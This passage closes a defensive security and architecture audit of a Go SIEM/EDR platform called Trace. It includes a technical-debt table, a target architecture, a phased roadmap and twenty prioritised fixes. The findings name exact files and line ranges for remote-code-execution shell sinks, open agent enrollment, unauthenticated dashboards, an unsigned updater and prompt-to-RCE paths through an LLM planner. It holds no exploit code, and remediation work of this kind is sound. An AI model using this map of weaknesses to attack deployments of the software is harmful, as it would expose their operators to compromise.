| TD-07 | `dev/cmd/trace/admin.go:32`, `edr_cmd.go:179-181`, `server/pb.go:345-357` | `Sprintf` JSON / raw query concat / `LIMIT %d` Sprintf | Today int/code-limited; tomorrow exploitable; pattern invites copy-paste | `json.Marshal`, `url.Query().Set`, placeholders (P0-P1) |
| TD-08 | Dual sources: `dev/playbooks/` vs `dev/internal/playbook/*.yaml`; dual stacks `response` vs `edr_agent/response`; dual `SIEMConfig`; `hash.go` vs `intel.go` IOC stores | Two truths for playbooks, response semantics, SIEM config, IOC verdicts | Fix lands in one place, bug lives in the other | Single source each (P1) |
| TD-09 | `dev/internal/storage/cold/pool.go:20` pool bypassed by `shard/router.go:88`; `storage/queue.go:192 Replay` test-only; `ScopeFromContext` tested but dead | Dead-but-tested code paths | False confidence; wasted maintenance | Wire or delete with tests (P1-P2) |
| TD-10 | `dev/tools/wazuh-converter/main.go` absolute paths; checked-in `*_gen.go` without lock | Unreproducible codegen | Vendor update cannot be verified | `-in/-out` flags + `ruleset.lock` + CI verify (P2) |
| TD-11 | `dev/docs/*` vs code skew: `:514` unbindable as image user, LDFLAGS version drop, `OR org_id=''` vs documented RBAC, disk-reject claimed but log-only | Deploys built from docs fail or open holes | Docs test: build from docs in CI; single version source (P1) |

# Recommended Target Architecture

Do NOT redesign everything. Keep what works; cut what kills. No microservices: the trust, lifecycle, and exactly-once problems get worse across network boundaries. The target is a modular monolith with hard internal boundaries, one binary, same ops shape.

```text
Current Architecture
  CLI god-object -> open HTTP mux (dashboard + API, one port, plaintext default)
    -> dual shell response (local + fleet run_script) + open enroll + body-trusted agent_id
    -> silent drops + synchronous=OFF + global approval flag + dead audit + unsigned supply
        |
        v  Problems: RCE chains, tenant leak, evidence loss, split-brain, unverifiable audit,
           untestable gods, 4 config systems, 7 vendor switch clusters, static intel
        |
        v
Target Architecture (same binary, same CLI shape, same TSE theory)
  CLI/TUI -> API GATEWAY (authN -> tenant bind -> scope x method -> rate-limit -> idempotency-key -> audit write)
    -> INGEST service (SIEM + EDR receivers; backpressure NACK/429; schema-validate; mint UUIDv7; tenant-pin; reject counters)
    -> DURABLE QUEUE (segments storing full events; drain loop; DLQ; OnDrop wired to metrics + notifier)
    -> DETECT service (precompiled regex; immutable rule snapshot; worker pool; versioned rule packs siem/rules/*.yaml; per-(rule,entity) suppress)
    -> DECIDE service (policy-gated planner: schema-validated LLM JSON; taint-tracked interpolation fail-closed; tool allowlist per caller)
    -> RESPOND service (argv-only executors; response-policy.yaml role x approval; per-step approval tokens nonce+step+identity+expiry; run_script deny-by-default; signed updates only)
    -> STORE service (TSE: NORMAL + checkpoint; hour-split writes; pruned indexed queries; atomic compactor; single lifecycle state machine; fenced single-writer leader; SigV4 streaming S3)
  TRUST plane: provision-token enroll; mTLS with peer verify; ctx-bound IDs + ownership predicates everywhere; hashed header-only keys with expiry
  OBSERVE plane: request IDs end-to-end; slog JSON; counters + histograms (HTTP/auth/agent/SIEM/action/queue); readiness checking DB+TSE+disk; wired audit (persisted KMS key, Details in HMAC, /api/v1/audit, paged Verify)
  EXTEND plane: registries (LLMProvider / EDRProvider / IntelSource / Notifier / Decoder / Connector factories); rules as versioned data with hot-reload; single config loader (TRACE_* > flag > file > DB > default) + Validate + effective-dump
```

What stays: single `trace` + `trace-agent` binaries; cobra CLI shape and playbook YAML shape; SQLite-hot / Parquet-manifest-cold theory with UUIDv7; offline embedded intel; pure-Go default with DuckDB opt-in; TUI + dashboard presentation (behind auth).
What changes: everything on the trust path (gateway, identity, tenancy, approvals, argv, signatures); everything on the durability path (NORMAL, lifecycle machine, drain loops, leases, deterministic flush); everything on the operability path (IDs, metrics, readiness, audit, pagination, idempotency); the extension mechanism (registries + data-driven rules).
What is explicitly NOT proposed: microservices, service mesh, Kafka/Raft until sharded single-node with fenced leadership saturates; Lucene-style free-text search; multi-writer SQLite; CGO-mandatory builds.
# Refactoring Roadmap

Priorities: P0 fix immediately (RCE, data-loss, tenant-leak, catastrophic integrity). P1 before major expansion (architecture that blocks growth). P2 during development (maintainability, perf, observability, testing, extensibility). P3 long-term capabilities.

## Phase 0 — Safety (P0; days, in this order)

| # | Task | Affected components | Dependencies | Expected benefit | Difficulty | Risks |
| - | ---- | ------------------- | ------------ | ---------------- | ---------- | ----- |
| 0.1 | Argv-only response + validators (netip/CIDR, PID digits, service allowlist, path confinement under quarantine root + `O_NOFOLLOW`); `run_script` deny-by-default behind signed policy + per-execution approval; delete client-side `chain` | `response/*`, `edr_agent/response/*` | None (leaf change) | Kills host + fleet RCE chains (SEC-11, AI-10-15/23) | Medium | Breaks workflows relying on `run_script`; gate with flag + migration notes |
| 0.2 | Auth on register/download/feed; provision-token enroll; server-assigned org; ctx-bound agent IDs + `AND agent_id=?`; per-route perms (revoke/compliance/dispatch allowlist + schema + size + approval + audit); enforce scope | `server/sync|pb|dashboard|permissions`, `edr_agent/agent` | 0.1 (dispatch shape) | Closes spoof/IDOR/privesc/tenant-spoof (SEC-02-08, AI-16-18) | Medium | Open-fleet workflows break; provide migration token + compat window |
| 0.3 | Dashboard + `/metrics` + `/api/live|tse` behind auth; readiness checks DB+TSE+disk; stop key print; header-only hashed keys + expiry | `server/*`, `config` | 0.2 | Stops network disclosure + false-green (SEC-01/15) | Low-Medium | Dashboard bookmarks need login; document key rotation |
| 0.4 | Fail-closed updater: signature + semver + HTTPS-only + separator-safe containment + fsync-swap | `server/sync`, `edr_agent/updater`, `deploy/install.*` | 0.2 (auth) | Removes supply-chain RCE (SEC-03/10/20) | Medium | Rollout needs staged keys; keep manual install path |
| 0.5 | `synchronous OFF` to `NORMAL`; wire checkpointer; hour-split writes; single-txn chunks | `storage/sqlite/*` | None | Durability + write correctness (R1-R2, A4-A6, D5) | Low | Throughput dip vs `OFF`; measure before/after |
| 0.6 | Compactor Tx variants; TTL `MaxTS<cutoff`; wire retention + `CleanupSuperseded` into one lifecycle machine | `storage/compactor|gc|manifest` | 0.5 | Stops corruption/premature-loss/disk-death (D9-D11, A19) | Medium | Backfill run on upgrade; test half-open files |
| 0.7 | Persist audit key 0600; include `Details` in HMAC; wire writes (auth/dispatch/revoke/case/user) + `/api/v1/audit`; 0600 secrets + stop logging params | `audit/*`, `server/*`, `config/*`, `playbook/executor` | 0.2 (actor identity) | Non-repudiation + secret hygiene (SEC-15-17, AI-20-21) | Medium | Log volume growth; sample or redact large outputs |
| 0.8 | Tenant predicates + backfill + index; `TenantID` from ctx; drop `OR org_id=''` | `server/*`, `db/*`, `serve.go`, storage writers | 0.2 | Multi-org safety (SEC-08, A1) | Medium | Migration needs backfill window + reindex |
| 0.9 | Per-step approval tokens (nonce+step+identity+expiry); `wait:` on all destructive playbooks; kill infinite poll | `playbook/*`, `investigation/*`, `approval.go`, `playbooks/*.yaml` | 0.7 (identity) | Safe containment (AI-19) | Medium | Approval UX change; provide CLI queue + notify |

## Phase 1 — Foundation (P1; weeks)

Single config loader (`TRACE_*` > flag > file > DB > default) + `Validate()` + `config check/dump`; unify `SIEMConfig`; registries (LLM/EDR/TI/Notifier/Decoder/Connector); schema-validate LLM JSON + taint-isolate outputs + redact; request IDs + slog JSON; HTTP/auth/agent/SIEM/action metrics + readiness; fix silent-error paths (cases/compliance/edge/admin); delete dead stubs (TD-01/04/09); cursor pagination everywhere; idempotency keys on dispatch/register; `Sprintf` JSON/query/LIMIT fixes (TD-07). Components: `config/*`, `cmd/trace/*`, `siem/*`, `dispatch/*`, `integration/*`, `server/*`, `cases/*`, `compliance/*`. Benefit: testable boundaries + operability. Difficulty: Medium-High. Risk: config migration — keep compat + warn, never silently ignore.

## Phase 2 — Core Architecture (P1-P2; weeks)

SIEM precompile + worker pool + fsnotify + conn limits + per-(rule,entity) suppress; playbook fail-closed interpolation + richer `if` (`>=`, `contains`, CIDR); task lease + attempts + DLQ; hunt pool + `next_run` CAS + cron; deterministic flusher IDs + contiguous watermark; agent drain loop preserving bytes/IDs; dedup table-name fix + full-batch persist + richer keys + correlate-pre-dedup; populate correlator types + self-test; hour-prune + tenant predicate + composite indexes; S3 SigV4 + streaming + `UseSSL` default; fenced leader lease. Benefit: correct detection, no double-exec, no premature loss, bounded HA. Difficulty: High. Risk: schema/index/flush migrations need backfill + shadow-read windows.

## Phase 3 — Scalability (P2-P3; weeks)

Push limits per tier + k-way merge + streaming cold reader + watermark/`FilesFor` TTL cache; single-txn writes; queue segments + drain + wired `OnDrop`; backup streaming + filtered rotation; disk-full enforce; rate-limit + event caps + 429; shard global watermark or defer shards; signed plugin registry + sandboxed sidecar; pinned digests + provenance/SBOM + `Vet` hard gate. Benefit: bounded RAM, linear headroom, verifiable supply. Difficulty: High. Risk: query-path rewrite — gate with flag + shadow reads; plugin signing needs key ceremony.

## Phase 4 — Advanced Capabilities (P3; weeks)

Alert lifecycle (ack/assign/SLA/escalation, single severity scale); case state machine + scoped paginated API; entity correlation graph; evidence custody (hash chain); bounded approvals with queue + notify; real audit query; evidence-backed compliance; scheduled + multi-case + CSV/CEF reporting; asset inventory + vuln join + risk scoring; versioned rule packs (`siem/rules/*.yaml`, `correlator.rules.yaml`, `seed-iocs.json`, `yara/*.yar`, `scoring.weights.yaml`, `response/policy.yaml`) with hot-reload. Benefit: production SOC completeness. Difficulty: Medium-High. Risk: scope creep — ship behind existing tables, one workflow at a time.

# TOP 20 ACTIONS (exactly 20, concrete, in execution order)

```text
#1
Action: Replace sh -c / powershell string sinks with argv exec + validators; run_script deny-by-default behind signed policy + per-execution approval; delete client-side chain.
Reason: Fleet + host RCE via ip/path/script (verified Sprintf to sh -c in both stacks).
Files: dev/internal/response/response.go:80-230, dev/internal/edr_agent/response/executor.go:50-72,209-407
Priority: P0 Difficulty: Medium Expected impact: Kills the primary RCE chain.
#2
Action: Require auth on enroll/download/feed; provision-token enrollment; server-assigned org; ctx-bound agent IDs + AND agent_id=? ownership predicates.
Reason: Open enroll + IDOR + tenant spoof (verified open routes + body-trusted agent_id).
Files: dev/internal/server/sync.go:143-157,344-400,376-672,1155-1275
Priority: P0 Difficulty: Medium Expected impact: Closes spoof, theft, forgery, and poison paths.
#3
Action: Gate dashboard + /metrics + /api/live|tse|charts behind auth; make /readyz check DB+TSE+disk.
Reason: Unauthenticated disclosure of investigations/IOCs/nodes + false-green health (verified zero-auth routes).
Files: dev/internal/server/dashboard.go:39-47, dev/internal/server/sync.go:876-940
Priority: P0 Difficulty: Low Expected impact: Stops network disclosure; honest health.
#4
Action: Fail-closed auto-update: code signature (cosign/sigstore) + semver compare + HTTPS-only + separator-safe containment + fsync before swap.
Reason: Unsigned channel + weak prefix + lexicographic versions yields root RCE via MITM or server compromise.
Files: dev/internal/server/sync.go:1163-1275, dev/internal/edr_agent/updater/updater.go:82-103, dev/deploy/install.sh, dev/deploy/install.ps1
Priority: P0 Difficulty: Medium Expected impact: Removes supply-chain RCE.
#5
Action: Fix per-route permissions (DELETE needs PermAgentRevoke; compliance needs perm; dispatch needs allowlist + schema + size + approval + audit) and enforce read-only scope.
Reason: Viewer revoke/write + dead scope + arbitrary run_script queue.
Files: dev/internal/server/sync.go:75,148-157,833-870,1051, dev/internal/server/permissions.go
Priority: P0 Difficulty: Low Expected impact: Stops privilege escalation.
#6
Action: Per-step approval tokens (nonce + step + identity + expiry); add wait: analyst_approval to every destructive playbook; remove infinite 500ms poll.
Reason: Global status flag is a TOCTOU bypass; destructives default to zero HITL.
Files: dev/internal/playbook/executor.go:70-208, dev/internal/investigation/investigation.go:123-129, dev/cmd/trace/approval.go, dev/playbooks/*.yaml
Priority: P0 Difficulty: Medium Expected impact: Containment becomes safe to automate.
#7
Action: Hash user API keys (SHA-256+), header-only transport, stop stdout print, add expiry + rotation + server-side rate-limit.
Reason: Plaintext keys + URL transport + printed at boot with no throttling.
Files: dev/internal/server/pb.go:429,489, dev/internal/server/sync.go:65, dev/internal/server/server.go:24
Priority: P0 Difficulty: Medium Expected impact: Credential theft window collapses.
#8
Action: synchronous OFF to NORMAL, wire the checkpointer, hour-split write batches, single-transaction chunks.
Reason: Acked batches can vanish; cross-hour batches mis-partition; 16x fsync amplification (verified pragmas + events[0] + 62-chunks).
Files: dev/internal/storage/sqlite/hot_store.go:49-156,225, dev/internal/storage/sqlite/checkpoint.go:17
Priority: P0 Difficulty: Low Expected impact: Durability + write correctness.
#9
Action: Fix compactor atomicity (Tx variants), TTL predicate (MaxTS < cutoff), and wire retention + CleanupSuperseded into a single lifecycle state machine.
Reason: Manifest divergence + premature cold loss + unbounded disk growth.
Files: dev/internal/storage/compactor/compactor.go:62-179, dev/internal/storage/gc/*, dev/internal/storage/manifest/manifest.go
Priority: P0 Difficulty: Medium Expected impact: Stops corruption, loss, and disk death.
#10
Action: Persist the audit key (0600), include Details in the HMAC, wire Write on auth/dispatch/revoke/case/user transitions, add /api/v1/audit with paged Verify.
Reason: Audit is dead, mutable, and unverifiable (verified zero callsites + ephemeral key).
Files: dev/internal/audit/logger.go:38-83, dev/cmd/trace/root.go:466, dev/internal/server/sync.go
Priority: P0 Difficulty: Medium Expected impact: Non-repudiation for destructive actions.
#11
Action: 0600 secrets + *_FILE variants; never log params/outputs/keys; redact timeline and LLM logs; fix Sprintf JSON/query/LIMIT builders.
Reason: Keys in 0644 plus full params in JSONL; injection-adjacent builders invite the next bug.
Files: dev/internal/config/config.go:130, dev/internal/server/agent_config.go:55, dev/cmd/trace/genkey.go:80, dev/internal/playbook/executor.go:116-168, dev/cmd/trace/admin.go:32, dev/cmd/trace/edr_cmd.go:179
Priority: P0 Difficulty: Low Expected impact: Local disclosure closed.
#12
Action: Tenant predicates on every query + backfill + index; TenantID from auth context (remove default); drop OR org_id=''.
Reason: Decorative isolation leaks across tenants on day one of multi-user mode.
Files: dev/internal/server/sync.go:535-689, dev/internal/server/pb.go:330, dev/internal/db/db.go, dev/cmd/trace/serve.go:143
Priority: P0 Difficulty: Medium Expected impact: Multi-org safety.
#13
Action: Schema-validate LLM JSON output; taint-isolate untrusted tool outputs from interpolation targets and report synthesis; keep prompt-versioned cache but verify before store.
Reason: Prompt-to-RCE + tool-to-tool indirect injection + cache poisoning.
Files: dev/internal/dispatch/host.go:114-452, dev/internal/playbook/interpolate.go:51-109
Priority: P1 Difficulty: Medium Expected impact: AI chain contained without losing the planner.
#14
Action: Precompile SIEM regex, shared immutable rule snapshot, worker pool; fsnotify + line cap + connection limits; per-(rule,entity) suppression.
Reason: Per-event compile + single goroutine + global suppress drops bursts and hides lateral movement.
Files: dev/internal/siem/rules.go:752-862, dev/internal/siem/siem.go:178-340, dev/internal/siem/alertmgr/manager.go
Priority: P1 Difficulty: Medium Expected impact: Detection keeps up with bursts.
#15
Action: Task UPDATE WHERE pending + lease/attempts/DLQ; hunt next_run CAS + worker pool + cron; batch bounded attempts to DLQ; agent drain loop preserving bytes/IDs.
Reason: Double-claim destructive work, duplicate hunts, poison head-of-line, never-draining retry queue.
Files: dev/internal/taskqueue/taskqueue.go:55, dev/internal/hunt/*, dev/internal/storage/batch/writer.go:88, dev/internal/edr_agent/agent.go:678, dev/internal/edr_agent/queue/queue.go:89
Priority: P1 Difficulty: Medium Expected impact: No double-destruction; no stuck work.
#16
Action: Push limits into hot/cold/shard tiers, single k-way merge, streaming row-group reads, prune tables by hour + tenant predicate, TTL-cache watermark/FilesFor.
Reason: Materialize-then-limit OOM plus full scans (verified UNION ALL + 100k+100k).
Files: dev/internal/storage/sqlite/hot_store.go:348-395, dev/internal/storage/router/router.go:40-132, dev/internal/storage/cold/parquet_reader.go:168-205, dev/internal/storage/shard/router.go:195
Priority: P1 Difficulty: High Expected impact: Bounded RAM and surviving p99.
#17
Action: Single config loader + Validate + effective-dump; unify SIEMConfig; registries for LLM/EDR/TI/Notifier/Decoder/Connector; rules as versioned data with hot-reload.
Reason: Four config systems + dead type + seven vendor switch clusters + static intel block every extension.
Files: dev/internal/config/config.go, dev/cmd/trace/serve.go, dev/cmd/trace/root.go, dev/internal/siem/*, dev/internal/dispatch/host.go, dev/internal/integration/edr/edr.go, dev/internal/integration/notifier/notifier.go, dev/internal/archive/intel.go, dev/internal/sift/hash.go, dev/internal/edr_agent/monitor/yara.go, dev/internal/edr_agent/monitor/correlator.go
Priority: P1 Difficulty: High Expected impact: Extensions become days, not refactors.
#18
Action: Request IDs end-to-end + slog JSON + HTTP/auth/agent/SIEM/action metrics (counter types) + readiness; check WriteEvent errors; fix silent continues in cases/compliance.
Reason: Operators cannot answer what/why/which-component/what-data/before-after; loss presented as success.
Files: dev/internal/server/sync.go:71-75,534-552, dev/internal/playbook/executor.go:39-168, dev/internal/storage/metrics/metrics.go, dev/internal/cases/manager.go:159-224, dev/internal/compliance/report.go:154-405
Priority: P2 Difficulty: Medium Expected impact: Incidents become debuggable.
#19
Action: S3 SigV4 + streaming + UseSSL default; fenced leader lease with single writer; streaming backup + filtered rotation; disk-full enforce; signed plugin registry + sandboxed sidecar; pinned digests + provenance/SBOM + hard Vet gate.
Reason: Plaintext MinIO-only + split-brain + RAM backup + log-only disk + unsigned .so/curl|bash.
Files: dev/internal/storage/s3.go, dev/internal/storage/leader.go, dev/internal/storage/backup/scheduler.go, dev/cmd/trace/tse_init.go:166, dev/internal/plugin/plugin.go, dev/internal/plugin/sidecar.go, dev/cmd/trace/plugin_cmd.go, dev/deploy/install.sh, dev/deploy/install.ps1, dev/.github/workflows/*, dev/Dockerfile, dev/docker-compose.yml
Priority: P2 Difficulty: High Expected impact: Safe HA and verifiable supply chain.
#20
Action: Alert lifecycle (ack/assign/SLA) + case state machine + scoped paginated APIs; entity correlation; evidence custody; bounded approvals with queue + notify; scheduled + machine-readable reporting; asset inventory + risk join; cursor pagination + idempotency keys.
Reason: No owner/SLA, free-form cases, IOC-count correlation, no custody, invisible approvals, truncation, double-dispatch.
Files: dev/internal/siem/siem.go:25-33, dev/internal/cases/manager.go, dev/internal/server/pb.go:345-357, dev/internal/playbook/executor.go:70-99, dev/internal/hunt/*, dev/internal/server/sync.go:850-870
Priority: P3 Difficulty: High Expected impact: Production SOC completeness.
```

---

## Audit provenance

- Slices: `ArchMapAudit`, `SecurityAudit` (security-reviewer), `HardcodeConfigAudit`, `AgentAISecurityAudit`, `DataPerfReliabilityAudit`, `QualityTestObsApiAudit`, `DeploySupplyProductAudit`. Transcripts: `history://<id>` per slice.
- Critical code claims re-verified by direct read on 2026-09-20: open EDR routes (`sync.go:143-157`), unauth dashboard (`dashboard.go:39-47`), endpoint shell sinks (`executor.go:209-273`), local shell sinks (`response.go:80-137`), hot-store `synchronous=OFF` (`hot_store.go:49-55`).
- No modifications made. No dependencies installed. No unverified CVE claims. No benchmark numbers asserted.
- Report file: `D:/Projects_And_Learning/AI/Trace/AUDIT.md` (this file).
